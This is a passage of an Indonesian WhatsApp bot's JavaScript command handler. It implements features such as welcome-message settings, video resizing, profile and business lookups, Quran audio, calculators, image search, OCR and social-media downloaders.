            m.reply('Sambutan akhir pekan dinonaktifkan.');
            updated = true;
        } else {
            const newMessage = args.slice(1).join(' ');
            if (newMessage) {
                welcomeSettings.weekend.message = newMessage;
                m.reply(`Pesan sambutan akhir pekan diatur menjadi:\n"${newMessage}"`);
                updated = true;
            } else {
                m.reply('Pesan tidak boleh kosong.');
            }
        }
    }
    // Logika untuk Global Welcome (jika Anda menggunakannya)
    else if (type === 'global') {
        if (args[1] === 'on') {
            welcomeSettings.global_welcome.enabled = true;
            m.reply('Sambutan global diaktifkan.');
            updated = true;
        } else if (args[1] === 'off') {
            welcomeSettings.global_welcome.enabled = false;
            m.reply('Sambutan global dinonaktifkan.');
            updated = true;
        } else {
            const newMessage = args.slice(1).join(' ');
            if (newMessage) {
                welcomeSettings.global_welcome.message = newMessage;
                m.reply(`Pesan sambutan global diatur menjadi:\n"${newMessage}"`);
                updated = true;
            } else {
                m.reply('Pesan tidak boleh kosong.');
            }
        }
    } else if (type === 'global_cooldown') {
        const cooldown = parseInt(args[1]);
        if (!isNaN(cooldown) && cooldown >= 0) {
            welcomeSettings.global_welcome.cooldown_minutes = cooldown;
            m.reply(`Cooldown sambutan global diatur menjadi ${cooldown} menit.`);
            updated = true;
        } else {
            m.reply('Cooldown harus berupa angka positif atau nol (0 untuk kirim setiap pesan).');
        }
    }
    else {
        m.reply('Tipe sambutan tidak valid. Pilih `new_user`, `new_user_days`, `weekend`, `global`, atau `global_cooldown`.');
    }

    if (updated) {
        await writeWelcomeSettings(welcomeSettings);
    }
}
break;

case 'ceksambutan': {
    if (!isOwner) return m.reply('Perintah ini hanya untuk Owner.');

    let statusNewUser = welcomeSettings.new_user.enabled ? 'Aktif' : 'Nonaktif';
    let msgNewUser = welcomeSettings.new_user.message;
    let daysNewUser = welcomeSettings.new_user.days_inactive;

    let replyMsg = `*Status Fitur Sambutan:*\n\n`;
    replyMsg += `*Sambutan Pengguna Baru/Tidak Aktif:*\n`;
    replyMsg += `  Status: ${statusNewUser}\n`;
    replyMsg += `  Batas Hari Tidak Aktif: ${daysNewUser} hari\n`;
    replyMsg += `  Pesan: "${msgNewUser}"\n\n`;
    
    // Info untuk Weekend Welcome (jika Anda menggunakannya)
    let statusWeekend = welcomeSettings.weekend.enabled ? 'Aktif' : 'Nonaktif';
    replyMsg += `*Sambutan Akhir Pekan:*\n`;
    replyMsg += `  Status: ${statusWeekend}\n`;
    replyMsg += `  Pesan: "${welcomeSettings.weekend.message}"\n\n`;

    // Info untuk Global Welcome (jika Anda menggunakannya)
    let statusGlobal = welcomeSettings.global_welcome.enabled ? 'Aktif' : 'Nonaktif';
    replyMsg += `*Sambutan Global:*\n`;
    replyMsg += `  Status: ${statusGlobal}\n`;
    replyMsg += `  Cooldown: ${welcomeSettings.global_welcome.cooldown_minutes} menit\n`;
    replyMsg += `  Pesan: "${welcomeSettings.global_welcome.message}"\n\n`;

    replyMsg += `Gunakan ${prefix}setwelcome untuk mengubah pengaturan.`;

    m.reply(replyMsg);
}
break;
//=======================================================
   
case 'resizevideo': case 'resizevid': {
  const fs = require('fs')
  const path = require('path')
  const { spawn } = require('child_process')
  const { downloadMediaMessage } = require('@whiskeysockets/baileys')
  const tmpFolder = path.join(__dirname, 'tmp')
  if (!fs.existsSync(tmpFolder)) fs.mkdirSync(tmpFolder)
  const qmsg = m.quoted
  const isQuotedVideo = qmsg?.mimetype?.startsWith('video') || qmsg?.type === 'videoMessage' || qmsg?.mtype === 'videoMessage'
  if (!isQuotedVideo) {
    return m.reply(`*Kamu harus reply ke video!*\nContoh:\nBalas video lalu ketik:\n${prefix+command}\natau\n${prefix+command} 640`
)
  }
  const standardWidths = [360, 480, 640, 720, 1080]
  await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
  try {
    const videoBuffer = await downloadMediaMessage(qmsg, 'buffer', {}, { reuploadRequest: Sky.updateMedia })
    const filename = `${Date.now()}`
    const inputPath = path.join(tmpFolder, `${filename}.mp4`)
    const outputPath = path.join(tmpFolder, `${filename}_resized.mp4`)
    fs.writeFileSync(inputPath, videoBuffer)
    const getResolution = () => new Promise((resolve, reject) => {
      const ffprobe = spawn('ffprobe', [
        '-v', 'error',
        '-select_streams', 'v:0',
        '-show_entries', 'stream=width,height',
        '-of', 'csv=p=0:s=x',
        inputPath
      ])
      let data = ''
      ffprobe.stdout.on('data', chunk => data += chunk)
      ffprobe.on('close', () => {
        const [width, height] = data.trim().split('x').map(Number)
        if (!width || !height) return reject(new Error('Gagal mendapatkan resolusi video'))
        resolve({ width, height })
      })
      ffprobe.on('error', reject)
    })
    const res = await getResolution()
    const originalWidth = res.width
    const originalHeight = res.height
    const aspectRatio = originalWidth / originalHeight
    let inputWidth = args[0] ? parseInt(args[0].trim()) : 1080
    if (isNaN(inputWidth)) inputWidth = 1080
    if (!args[0]) {
      let sizeListText = standardWidths
        .map(w => {
          const h = Math.round(w / aspectRatio)
          return `• ${w}x${h}`
        }).join('\n')
      return m.reply(`Ukuran asli video: *${originalWidth}x${originalHeight}*\n\nDaftar ukuran resize yang tersedia (tinggi menyesuaikan rasio):\n${sizeListText}\n\nContoh penggunaan:\nresizevideo 360\nresizevideo 640\nresizevideo 1080`)
    }
    let newWidth = inputWidth > originalWidth ? originalWidth : inputWidth
    let newHeight = Math.round(newWidth / aspectRatio)
    await m.reply( `Sedang meresize video ke *${newWidth}x${newHeight}*...` )
    await new Promise((resolve, reject) => {
      const ffmpeg = spawn('ffmpeg', ['-i', inputPath, '-vf', `scale=${newWidth}:${newHeight}`, '-preset', 'fast', outputPath])
      ffmpeg.on('close', code => code === 0 ? resolve() : reject(new Error('FFmpeg gagal meresize video')))
    })
    await Sky.sendMessage(m.chat, {
      video: fs.readFileSync(outputPath),
      mimetype: 'video/mp4',
      caption: `Berhasil resize video ke *${newWidth}x${newHeight}*`
    }, { quoted: m })
    fs.unlinkSync(inputPath)
    fs.unlinkSync(outputPath)
    await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
  } catch (err) {
    console.error(err)
    m.reply(`Gagal resize video:\n\n${err.message}`)
    await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
  }
}
break
   
//=======================================================

case 'getbisnis': case 'getbusiness': {
  const moment = require('moment-timezone');
  let input = m.quoted ? m.quoted.sender : text || m.sender;
  input = input.replace(/[^+\d]/g, '');
  let target;
  if (input.startsWith('+')) {
    target = input.slice(1).replace(/^0+/, '') + '@s.whatsapp.net';
  } else if (input.startsWith('0')) {
    target = '62' + input.slice(1) + '@s.whatsapp.net';
  } else if (input.startsWith('62')) {
    target = input + '@s.whatsapp.net';
  } else if (input.includes('@s.whatsapp.net')) {
    target = input;
  } else {
    target = '62' + input + '@s.whatsapp.net';
  }
    await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
  try {
    const profile = await Sky.getBusinessProfile(target);
    const name = await Sky.getName(target); 
    const pfp = await Sky.profilePictureUrl(target, 'image').catch(() => null);
    const desc = profile.description || 'Tidak ada deskripsi bisnis.';
    const category = profile.category || 'Tidak diketahui';
    const website = profile.website || 'Tidak tersedia';
    const address = profile.address || 'Tidak dicantumkan';
    const email = profile.email || 'Tidak dicantumkan';
    const caption = `*📇 PROFIL BISNIS*\n\n` +
      `*👤 Nama:* ${name}\n` +
      `*🏢 Kategori:* ${category}\n` +
      `*🌐 Website:* ${website}\n` +
      `*📍 Alamat:* ${address}\n` +
      `*✉️ Email:* ${email}\n\n` +
      `*📝 Deskripsi:*\n${desc}`;
    if (pfp) {
      await Sky.sendMessage(m.chat, {
        image: { url: pfp },
        caption,
      }, { quoted: m });
    } else {
      m.reply(caption);
    }
   await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
  } catch (err) {
    console.error(err);
    m.reply('Itu Bukan Akun Bisnis.');
    await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
  }
}
break

//=======================================================

case 'murotal': {
const axios = require('axios')
  if (!args[0]) {
    try {
      let { data } = await axios.get('https://gist.githubusercontent.com/Bell575/382f3dd393f45eaac298d5b845112258/raw/dbcdc554a51e06a13795a2ff1fe15b85f55e8d9d/List%2520Surah')
      return m.reply(
        `Cara Pakai : murotal [Nomor Surah]\n*Example : .murotal 144*\n\n*List Surah :*\n\n${data}\n\n`
      )
    } catch (e) {
      return m.reply('Gagal Ambil List Surah')
    }
  }
await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
  try {
    let { data } = await axios.get(`https://cloudku.us.kg/api/murotal/surah?id=${args[0]}`)
    let res = data.result
    if (!res) return m.reply('Surah Gak Ada')

    let teks =
      `Surah : ${res.name_id}\n\n` +
      `Nomor : ${res.number}\n` +
      `Nama Latin : ${res.name_en}\n` +
      `Nama Arab : ${res.name_long}\n` +
      `Jumlah Ayat : ${res.number_of_verses}\n` +
      `Tempat Turun : ${res.revelation_id} (${res.revelation_en})\n` +
      `Urutan Wahyu : ${res.sequence}\n` +
      `Arti : ${res.translation_id} (${res.translation_en})\n\n` +
      `Tafsir :\n${res.tafsir}`

    await m.reply(teks)
    await Sky.sendMessage(m.chat, {
      audio: { url: res.audio_url },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m })
await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
  } catch (e) {
    m.reply('Failed to fetch surah data. Make sure the surah number is correct')
    await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
  }
}
break;
 
//=======================================================

case "tambah":
        {
          if (!text.includes("+"))
            return m.reply(
              `Gunakan dengan cara ${
                prefix + command
              } *angka* + *angka*\n\n_Contoh_\n\n${prefix + command} 1+2`
            );
          arg = args.join(" ");
          atas = arg.split("+")[0];
          bawah = arg.split("+")[1];
          await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
          try {
          var nilai_one = Number(atas);
          var nilai_two = Number(bawah);
          m.reply(`${nilai_one + nilai_two}`);
          await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
          } catch (e) {
          m.reply(`✋😐🤚`)
          await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
          }
        }
        break;
      case "kurang":
        {
          if (!text.includes("-"))
            return m.reply(
              `Gunakan dengan cara ${
                prefix + command
              } *angka* - *angka*\n\n_Contoh_\n\n${prefix + command} 1-2`
            );
          arg = args.join(" ");
          atas = arg.split("-")[0];
          bawah = arg.split("-")[1];
          await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
          try {
          var nilai_one = Number(atas);
          var nilai_two = Number(bawah);
          m.reply(`${nilai_one - nilai_two}`);
         await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
            } catch (e) {
           await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
          m.reply(`✋😐🤚`)
          }
        }
        break;
      case "kali":
        {
          if (!text.includes("*"))
            return m.reply(
              `Gunakan dengan cara ${
                prefix + command
              } *angka* * *angka*\n\n_Contoh_\n\n${prefix + command} 1*2`
            );
          arg = args.join(" ");
          atas = arg.split("*")[0];
          bawah = arg.split("*")[1];
          await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
          try {
          var nilai_one = Number(atas);
          var nilai_two = Number(bawah);
          m.reply(`${nilai_one * nilai_two}`);
          await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
           } catch (e) {
          await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
          m.reply(`✋😐🤚`)
          }
        }
        break;
      case "bagi":
        {
          if (!text.includes("/"))
            return m.reply(
              `Gunakan dengan cara ${
                prefix + command
              } *angka* / *angka*\n\n_Contoh_\n\n${prefix + command} 1/2`
            );
          arg = args.join(" ");
          atas = arg.split("/")[0];
          bawah = arg.split("/")[1];
          await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
          try {
          var nilai_one = Number(atas);
          var nilai_two = Number(bawah);
          m.reply(`${nilai_one / nilai_two}`);
          await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
           } catch (e) {
          m.reply(`✋😐🤚`)
         await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
          }
        }
        break;
//=======================================================

case 'ambillinkgc' : case 'clinkgc': {
if (!text) return m.reply(`Mana id grup nya\nContoh: ${prefix+command} 1234@g.us\n\n untuk dapetin id grup ketik aja *${prefix}cekidgc* di dalam grup`)
await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
try {
const code = await Sky.groupInviteCode(text)
m.reply(`Link grup berhasil di buat!:https://chat.whatsapp.com/${code}?mode=ac_t`)
await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
} catch (e) {
m.reply(`Pastikan id grup benar karena: ${e}`)
await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
}
}
break
    
//=======================================================

case 'transfermarkt': {
  if (!text) return m.reply('Masukin nama pemain nya\nContoh: .transfermarkt Ole Romeny')

  await Sky.sendMessage(m.chat, { react: { text: '🕒', key: m.key } })

  const res = await fetch(`https://zenzxz.dpdns.org/search/transfermarkt?query=${encodeURIComponent(text)}`)
  const json = await res.json()

  if (!json.status || !json.data) return m.reply('Data pemain lu gaada wok')

  const data = json.data
  const caption = `
Nama          : ${data.name}
Nomor Punggung: ${data.shirtNumber}
Tanggal Lahir : ${data.birthdate}
Kebangsaan    : ${data.nationality}
Tinggi        : ${data.height}
Kaki Dominan  : ${data.foot}
Posisi        : ${data.position}
Agen          : ${data.agent}
Kontrak Hingga: ${data.contractUntil}
Market Value  : ${data.marketValue}
Klub          : ${data.club}
Kompetisi     : ${data.league}
  `.trim()
const pp = await getBuffer(data.photo)
  await Sky.sendMessage(m.chat, {image: pp, caption}, {quoted: m})
  await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
  }
  break

//=======================================================
    
/* *[ Fitur Unsplash ]*
Type? Case
Req: +62 815-xxxx-xxxx
Scrape: https://whatsapp.com/channel/0029VbANq6v0VycMue9vPs3u/134
*/

case 'unsplash': {
    if (!text) return m.reply('Masukkan kata kunci pencarian!\nContoh: unsplash nature');
    const axios = require('axios');
    await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
    function formatDate(isoString) {
        const date = new Date(isoString);
        const day = String(date.getDate()).padStart(2, '0');
        const month = String(date.getMonth() + 1).padStart(2, '0');
        const year = date.getFullYear();
        const hours = String(date.getHours()).padStart(2, '0');
        const minutes = String(date.getMinutes()).padStart(2, '0');
        return `${day}-${month}-${year} ${hours}:${minutes}`;
    }
    async function unsplashSearch(query) {
        try {
            const { data } = await axios.get(`https://unsplash.com/napi/search/photos?page=${Math.floor(Math.random() * 100) + 1}&per_page=20&query=${encodeURIComponent(query)}`);
            return data.results.map(res => ({
                title: res.alt_description || 'No Title',
                likes: res.likes,
                is_premium: res.premium,
                is_plus: res.plus,
                author: {
                    name: res.user.name,
                    username: res.user.username,
                    avatar: res.user.profile_image.large,
                    url: `https://unsplash.com/@${res.user.username}`
                },
                thumbnail: res.urls,
                created_at: formatDate(res.created_at),
                updated_at: formatDate(res.updated_at),
                downloadUrl: res.links.download,
                url: res.links.html
            }));
        } catch (e) {
            m.reply(`Eror because: ${e}`)
            await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
            console.error(e);
            return [];
        }
    }
    let results = await unsplashSearch(text);
    if (!results.length) return m.reply('❌ Tidak ada hasil ditemukan dari Unsplash.');
    let teks = `📷 *Hasil Pencarian Unsplash*\n🔎 Kata kunci: *${text}*\n\n`;
    results.slice(0, 5).forEach((r, i) => {
        teks += `📌 *${r.title}*\n👍 Likes: ${r.likes}\n👤 Author: ${r.author.name} (@${r.author.username})\n🗓️ Upload: ${r.created_at}\n🔗 Link: ${r.url}\n📥 Download: ${r.downloadUrl}\n\n`;
    });
    teks+= `📥 Ketik ${prefix}getft link_download untuk mengunduh foto\nContoh: ${prefix}getft https://unsplash.com/photos/tNDvFkxkBHo/download?ixid=M3wxMjA3fDB8MXxzZWFyY2h8NTIyfHxuYXR1cmV8ZW58MHx8fHwxNzUwNDExOTE1fDA\n📝 Ada beberapa foto yang tidak bisa di download alias premium, jadi anda perlu ke link unsplashnya langsung (bukan ke link download)`
    m.reply(teks);
await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
}
break
    
//=======================================================
    
case 'pakustad': {
  if (!text) return m.reply(`Contoh:\n${prefix + command} Makan Sambil Kuyang Bisa Gak Pak Ustad`)
  await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
   try {
  await Sky.sendMessage(m.chat, {
    image: { url: 'https://api.taka.my.id/tanya-ustad?quest=' + encodeURIComponent(text) }
  }, { quoted: m })
 await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
 } catch (e) {
 m.reply(`API Eror Because: ${e}`)
 await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
 console.log(e)
 }
}
break

//=======================================================
   
case 'pakustad2': {
  if (!text) return m.reply(`Contoh:\n${prefix + command} Makan Sambil Kuyang Bisa Gak Pak Ustad`)
  await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
   try {
  await Sky.sendMessage(m.chat, {
    image: { url: 'https://flowfalcon.dpdns.org/imagecreator/pustaz?text=' + encodeURIComponent(text) }
  }, { quoted: m })
 await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
 } catch (e) {
 m.reply(`API Eror Because: ${e}`)
 await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
 console.log(e)
 }
}
break

//=======================================================
    
 case 'pakustad3': {
  if (!text) return m.reply(`Contoh:\n${prefix + command} Makan Sambil Kuyang Bisa Gak Pak Ustad`)
  await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
   try {
  await Sky.sendMessage(m.chat, {
    image: { url: 'https://api.taka.my.id/pak-ustadv2?text=' + encodeURIComponent(text) }
  }, { quoted: m })
 await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
 } catch (e) {
 m.reply(`API Eror Because: ${e}`)
 await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
 console.log(e)
 }
}
break

//=======================================================
    
 case 'wastalk': {
let moment = require('moment-timezone');
let PhoneNum = require('awesome-phonenumber');

let regionNames = new Intl.DisplayNames(['id'], { type: 'region' });

    let num = m.quoted?.sender || m.mentionedJid?.[0] || text;
    if (!num) return m.reply(`• *Contoh :* ${prefix + command} @tag / 628xxx`)
await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
    num = num.replace(/\D/g, '') + '@s.whatsapp.net';

    let existsCheck = await Sky.onWhatsApp(num).catch(() => []);
    if (!existsCheck[0]?.exists) return m.reply('🚩 Pengguna tidak ada')

    let img = await Sky.profilePictureUrl(num, 'image').catch(() => './src/avatar_contact.png');
    let bio = await Sky.fetchStatus(num).catch(() => null);
    let business = await Sky.getBusinessProfile(num).catch(() => null);

    let name;
    try {
        name = await Sky.getName(num);
    } catch {
        name = 'Tidak diketahui';
    }

    let format = new PhoneNum(`+${num.split('@')[0]}`);
    let country = regionNames.of(format.getRegionCode('international')) || 'Tidak diketahui';

    let htki = '–––––––––––––––––––––––––––––––';
    let htka = '–––––––––––––––––––––––––––––––';

    let wea = `${htki} Stalking WhatsApp ${htka}\n\n` +
        `*° Negara :* ${country.toUpperCase()}\n` +
        `*° Nama :* ${name}\n` +
        `*° Format Nomor :* ${format.getNumber('international')}\n` +
        `*° Url Api :* wa.me/${num.split('@')[0]}\n` +
        `*° Sebutan :* @${num.split('@')[0]}\n` +
        `*° Status :* ${bio?.status || '-'}\n` +
        `*° Tanggal Status :* ${bio?.setAt ? moment(bio.setAt).locale('id').format('LL') : '-'}`;

    if (business) {
        wea += `\n\n${htki} Stalking Bisnis WhatsApp ${htka}\n\n` +
            `*° BusinessId :* ${business.wid}\n` +
            `*° Website :* ${business.website || '-'}\n` +
            `*° Email :* ${business.email || '-'}\n` +
            `*° Kategori :* ${business.category || '-'}\n` +
            `*° Alamat :* ${business.address || '-'}\n` +
            `*° Zona Waktu :* ${business.business_hours?.timezone || '-'}\n` +
            `*° Deskripsi :* ${business.description || '-'}`;
    } else {
        wea += `\n\n*Akun WhatsApp Standar*`;
    }

    try {
        await Sky.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: m });
    } catch {
        m.reply(wea);
    }
   await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
};
break
    
//=======================================================
    
case 'toviourl': {
const axios = require('axios')
const FormData = require('form-data')
 async function uploadMedia(buffer, filename) {
    const form = new FormData()
    form.append('file', buffer, filename)

    const { data } = await axios.post('https://cdn.vioo.my.id/upload', form, {
      headers: {
        ...form.getHeaders(),
        'Accept': 'application/json'
      }
    })

    return data
  }

  try {
    let q = m.quoted || m
    let mime = (q.msg || q).mimetype || ''
    if (!mime) m.reply(`Ketik ${prefix+command} dengan membalas media`)
await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
    const buffer = await q.download()
    if (buffer.length > 50 * 1024 * 1024) throw 'Max Size 50MB'

    const ext = mime.split(';')[0].split('/')[1]
    const filename = `Anu_${Date.now()}.${ext}`

    const result = await uploadMedia(buffer, filename)
    m.reply(`Nih: ${result.data.url}`)
await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
  } catch (e) {
    m.reply(typeof e === 'string' ? e : e.message)
await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
  }
}
break;
    
//=======================================================
    
/*
📌 Nama Fitur: Ocr [ optical character recognition ]
🏷️ Type : Case
🔗 Sumber : https://whatsapp.com/channel/0029Vb6Zs8yEgGfRQWWWp639
✍️ Convert By ZenzXD
note : *ini gw convert dari eng ay, kalau eror fix sendiri okey :v*
*/
case 'ocr': {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
  try {
    await Sky.sendMessage(m.chat, {
      react: {
        text: '🕒',
        key: m.key
      }
    })
let media = await Sky.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Rafzbot.png');
let imageUrl = directLink.toString()
    let data = await fetch(`https://zenzxz.dpdns.org/tools/ocr?url=${encodeURIComponent(imageUrl)}`)
    await fs.unlinkSync(media)
    let hasil = await data.json()
    await Sky.sendMessage(m.chat, {
      react: {
        text: '✅',
        key: m.key
      }
    })
    m.reply(`${hasil.result}`)
  } catch (err) {
    m.reply(typeof err === 'string' ? err : err.message || 'terjadi kesalahan saat memproses gambar')
  }
}
break
    
//=======================================================
    
case 'dl': {
 // --- Panggil semua modul yang dibutuhkan ---
 const axios = require("axios");
 const { URL } = require("url");
 const path = require("path");

 try {
 const url = args[0];
 if (!url) 
 return m.reply("❓ Perintah tidak lengkap. Silakan masukkan URL yang ingin diunduh.\n\n*Contoh Penggunaan:*\n.dl https://www.tiktok.com/...\n\n✨ *Layanan yang Didukung:* ✨\n\n- 🎵 TikTok (Video & Slideshow Foto)\n- 📸 Instagram (Foto & Video)\n- 📘 Facebook\n- 🐦 Twitter / X\n- 📌 Pinterest\n- ☁️ SoundCloud\n- 🔥 MediaFire\n- 📦 Terabox\n- 🎥 YouTube (Video & Audio)\n\n*Untuk YouTube, gunakan format:*\n • `.dl <url>` *(untuk video, default)*\n • `.dl <url> mp3` *(untuk audio)*\n\n...dan link download langsung lainnya!");
 
await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
 
 const botName = `${botname2}`;

 // --- FUNGSI HELPER
 function formatDuration(seconds) {
 if (isNaN(seconds) || seconds < 0) return "N/A";
 // Nama variabel 'minutes' dan 'secs' ditambahkan
 const minutes = Math.floor(seconds / 60);
 const secs = Math.floor(seconds % 60);
 return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
 }

 // --- RUTE UTAMA BERDASARKAN URL ---

 // YouTube (Video & Audio)
 if (url.includes("youtube.com") || url.includes("youtu.be")) {
 const format = args[1]?.toLowerCase() || 'video';
 if (format === 'mp3' || format === 'audio') {
 await m.reply("⏳ Mengambil audio (MP3) dari YouTube...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/ytmp3?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 if (!apiResponse.status || !apiResponse.download_url) throw new Error("API ytmp3 Zenz tidak memberikan hasil yang valid.");
 const { title, author, lengthSeconds, views, thumbnail, download_url } = apiResponse;
 const caption = `╭─── 「 YOUTUBE AUDIO 」\n│\n├─ 🎵 *Judul:* ${title}\n├─ 👤 *Channel:* ${author}\n├─ ⏱️ *Durasi:* ${formatDuration(lengthSeconds)}\n├─ ▶️ *Dilihat:* ${views.toLocaleString('id-ID')}\n│\n╰─── 「 ${botName} 」`;
 await Sky.sendMessage(m.chat, { image: { url: thumbnail }, caption: caption }, { quoted: m });
 await Sky.sendMessage(m.chat, { audio: { url: download_url }, mimetype: 'audio/mpeg', fileName: `${title}.mp3` }, { quoted: m });
 } else {
 await m.reply("⏳ Mengambil video (MP4) dari YouTube...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/ytmp4?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 if (!apiResponse.status || !apiResponse.download_url) throw new Error("API ytmp4 Zenz tidak memberikan hasil yang valid.");
 const { title, author, lengthSeconds, views, thumbnail, download_url } = apiResponse;
 const caption = `╭─── 「 YOUTUBE VIDEO 」\n│\n├─ 🎬 *Judul:* ${title}\n├─ 👤 *Channel:* ${author}\n├─ ⏱️ *Durasi:* ${formatDuration(lengthSeconds)}\n├─ ▶️ *Dilihat:* ${views.toLocaleString('id-ID')}\n│\n╰─── 「 ${botName} 」`;
 await Sky.sendMessage(m.chat, { 
 video: { url: download_url }, 
 caption: caption, 
 mimetype: 'video/mp4',
 jpegThumbnail: (await axios.get(thumbnail, { responseType: 'arraybuffer' })).data
 }, { quoted: m });
 }
 
 // TikTok
 } else if (url.includes("tiktok.com")) {
 await m.reply("⏳ Mengambil data video TikTok...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/tiktok?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 const videoData = apiResponse?.result?.data;
 if (!apiResponse.status || !videoData) throw new Error("API TikTok Zenz tidak memberikan data video yang valid.");
 if (!videoData.play && (!videoData.images || videoData.images.length === 0)) throw new Error("Tidak ada media video atau gambar yang ditemukan.");
 if (videoData.images && videoData.images.length > 0) {
 const { title, author, music_info, images, music } = videoData;
 const caption = `╭─── 「 TIKTOK SLIDESHOW 」\n│\n├─ 💬 *Caption:* ${title}\n├─ 👤 *Uploader:* ${author?.nickname || 'N/A'}\n├─ 🎵 *Sound:* ${music_info?.title || 'Original Sound'}\n│\n╰─── 「 ${botName} 」`;
 await m.reply(caption);
 for (const imageUrl of images) {
 await Sky.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
 await new Promise(resolve => setTimeout(resolve, 1000));
 }
 if (music) {
 await m.reply(`🎵 Mengirim sound dari TikTok...`);
 await Sky.sendMessage(m.chat, { audio: { url: music }, mimetype: 'audio/mpeg' }, { quoted: m });
 }
 } else {
 const { title, play: videoUrl, author, music_info, digg_count, play_count } = videoData;
 const caption = `╭─── 「 TIKTOK VIDEO 」\n│\n├─ 💬 *Caption:* ${title}\n├─ 👤 *Uploader:* ${author?.nickname || 'N/A'}\n├─ ❤️ *Likes:* ${digg_count?.toLocaleString('id-ID') || 0}\n├─ ▶️ *Dilihat:* ${play_count?.toLocaleString('id-ID') || 0}\n│\n╰─── 「 ${botName} 」`;
 await Sky.sendMessage(m.chat, { video: { url: videoUrl }, caption: caption }, { quoted: m });
 }

 // Instagram
 } else if (url.includes("instagram.com")) {
 await m.reply("⏳ Mengambil media Instagram...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/instagram?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 const result = apiResponse.result;
 if (!apiResponse.status || !result) throw new Error("API Instagram Zenz tidak memberikan hasil yang valid.");
 const { name: postCaption, username, images, videos } = result;
 const mediaUrls = [...(images || []), ...(videos || [])];
 if (mediaUrls.length === 0) throw new Error("Tidak ada media yang ditemukan di postingan Instagram.");
 const caption = `╭─── 「 INSTAGRAM DOWNLOAD 」\n│\n├─ 💬 *Caption:* ${postCaption || 'Tanpa teks'}\n├─ 👤 *Username:* @${username || 'N/A'}\n│\n╰─── 「 ${botName} 」`;
 let isFirstMedia = true;
 for (const mediaUrl of mediaUrls) {
 const isVideo = (new URL(mediaUrl).pathname).endsWith('.mp4');
 await Sky.sendMessage(m.chat, { [isVideo ? 'video' : 'image']: { url: mediaUrl }, caption: isFirstMedia ? caption : '' }, { quoted: m });
 isFirstMedia = false;
 }
 
 // Facebook
 } else if (url.includes("facebook.com") || url.includes("fb.watch")) {
 await m.reply("⏳ Mengambil video Facebook...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/facebook?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 if (!apiResponse.status || !apiResponse.videos) throw new Error("API Facebook Zenz tidak memberikan hasil yang valid.");
 const { title = "Video Facebook", videos } = apiResponse;
 const videoData = videos.hd || videos.sd;
 if (!videoData || !videoData.url) throw new Error("Link download video tidak ditemukan.");
